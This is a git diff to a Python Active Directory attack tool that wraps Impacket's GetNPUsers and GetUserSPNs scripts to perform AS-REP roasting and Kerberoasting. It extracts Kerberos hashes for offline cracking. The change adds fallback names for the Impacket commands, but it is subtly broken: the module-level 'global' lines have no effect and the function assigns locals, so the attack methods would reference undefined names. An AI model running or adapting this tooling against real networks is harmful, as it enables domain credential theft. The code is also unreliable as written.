@@ -11,6 +11,9 @@ import socket
 from shutil import which
 from os import path
 
+global GetNPUsers
+global GetUserSPNs
+
 # Style
 class bcolors:
     HEADER = '\033[95m'
@@ -334,7 +337,8 @@ class KerbExploit:
         return isSuccess
     def __ExploitASREP(self, username:str, outputFile:str)-> bool:
         isSuccess = False
-        argProcess = ["GetNPUsers.py",self.domainName+"/"+username,"-no-pass"]
+        argProcess = [GetNPUsers,self.domainName+"/"+username,"-no-pass"]
+
         output = self.__RunImpacket(argProcess)
         for line in output:
             kerbHash = line.split('$')
@@ -345,9 +349,9 @@ class KerbExploit:
     def __ExploitKerberoasting(self, targetUser:str, username:str, password:str, TargetService:str, outputFile:str) -> bool:
         isSuccess = False
         if(username == None or password == None):
-            argProcess = ["GetUserSPNs.py",self.domainName+"/","-request-user",TargetService,"-no-pass"]
+            argProcess = [GetUserSPNs,self.domainName+"/","-request-user",TargetService,"-no-pass"]
         else:
-            argProcess = ["GetUserSPNs.py",self.domainName+"/"+username+':'+password,"-request-user",TargetService]
+            argProcess = [GetUserSPNs,self.domainName+"/"+username+':'+password,"-request-user",TargetService]
         output = self.__RunImpacket(argProcess)
         for line in output:
             kerbHash = line.split('$')
@@ -462,15 +466,23 @@ def CheckRequierment(userConfig: dict)-> None:
             log.warning("The command  '"+userConfig['JohnPath']+"' not found !")
             log.info("Link: https://github.com/openwall/john")
             exit(1)
-    GetUserSPNsPath = which('GetUserSPNs.py')
     GetNPUsersPath = which('GetNPUsers.py')
-    if(GetNPUsersPath is None or GetUserSPNsPath is None or 
-        not path.exists(GetUserSPNsPath) or not path.exists(GetNPUsersPath)): 
-        log.warning("Impacket must be install to run the tool !")
-        log.info("Link: https://github.com/SecureAuthCorp/impacket")
-        exit(1)
+    GetUserSPNsPath = which('GetUserSPNs.py')
+    if(GetNPUsersPath is not None and GetUserSPNsPath is not None):
+        GetNPUsers = 'GetNPUsers.py'
+        GetUserSPNs = 'GetUserSPNs.py'
+    else:
+        GetNPUsersPath = which('impacket-GetNPUsers')
+        GetUserSPNsPath = which('impacket-GetUserSPNs')
+        if(GetNPUsersPath is not None and GetUserSPNsPath is not None):
+            GetNPUsers = 'impacket-GetNPUsers'
+            GetUserSPNs = 'impacket-GetUserSPNs'
+        else:
+            log.warning("Impacket must be install to run the tool !")
+            log.info("Link: https://github.com/SecureAuthCorp/impacket")
+            exit(1)
 
-
+            
 def MainBanner() -> None:
     print("\n   █████╗ ██████╗     ███████╗███╗   ██╗██╗   ██╗███╗   ███╗")
     print("  ██╔══██╗██╔══██╗    ██╔════╝████╗  ██║██║   ██║████╗ ████║")
